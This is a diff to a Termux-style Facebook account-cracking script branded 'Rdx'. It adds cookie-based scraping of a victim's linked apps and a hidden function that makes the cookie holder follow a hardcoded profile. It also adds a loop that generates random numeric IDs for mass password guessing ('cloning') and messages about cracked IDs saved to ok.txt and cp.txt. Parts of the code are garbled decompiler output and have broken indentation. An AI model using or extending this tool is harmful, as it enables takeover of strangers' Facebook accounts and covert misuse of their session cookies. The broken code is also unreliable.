@@ -85,6 +85,57 @@ def FD():
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
     
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+
+def cek_apk(session,coki):
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+
+    def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
@@ -99,6 +150,33 @@ W='\033[1;95m'
 S='\033[1;93m'
 P='\033[1;92m'
 Y='\033[1;96m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
 #Dev:Rdx
 ##### LOGO #####
 logo = """
@@ -10636,6 +10714,11 @@ jalan("\033[1;93m ▇▇\033[1;92m            Tool Update EveryDay      \033[1;9
 jalan("\033[1;93m ▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93m ▇▇")
 jalan("\033[1;93m ▇▇\033[1;92m         Facebook Id -- Rdx       \033[1;93m              ▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
+print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+print('Crack process has been completed')
+print('Ids saved in ok.txt,cp.txt')
+print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+
 print "\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"
 CorrectUsername = "Rdx"
 CorrectPassword = "Rdx"
@@ -10655,6 +10738,13 @@ while (loop == 'true'):
     else:
         print "\033[1;97mWrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
+
+print("")
+    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    
 
 ##### LICENSE #####
 #=================#
@@ -11257,7 +11347,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;97m[+] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
+		print "\033[1;97m«-----------------\033[1;97mRDX\033[1;97m---------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
